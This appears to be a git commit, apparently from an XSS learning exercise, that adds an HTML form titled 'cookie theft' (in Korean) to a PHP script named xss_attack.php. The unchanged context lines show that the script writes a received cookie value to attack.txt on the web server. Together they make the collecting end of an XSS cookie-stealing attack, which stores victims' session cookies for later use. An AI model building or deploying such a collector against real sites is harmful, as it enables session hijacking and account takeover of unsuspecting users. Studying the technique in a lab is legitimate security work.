83161285dc8ad23eceb420780ea290fef8f5d125
dpdltm2944 <dpdltm2944@gmail.com>
2023-09-06 12:38:31 +0900

    xss_test

--- xss_attack.php
+++ xss_attack.php
@@ -4,3 +4,28 @@ $save_file=fopen("/var/www/html/attack.txt","w");
 fwrite($save_file,$cookie);
 fclose($save_file);
 ?>
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>쿠키 탈취</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <h1>쿠키 탈취</h1>
+    <form method="get" action="xss_attack.php">
+        <label for="cookie">쿠키:</label>
+        <input type="text" id="cookie" name="cookie" required>
+        <input type="submit" value="등록">
+    </form>
+    <footer>
+        © 2023 게시판. 모든 권리 보유.
+    </footer>
+
+</body>
+
+</html>
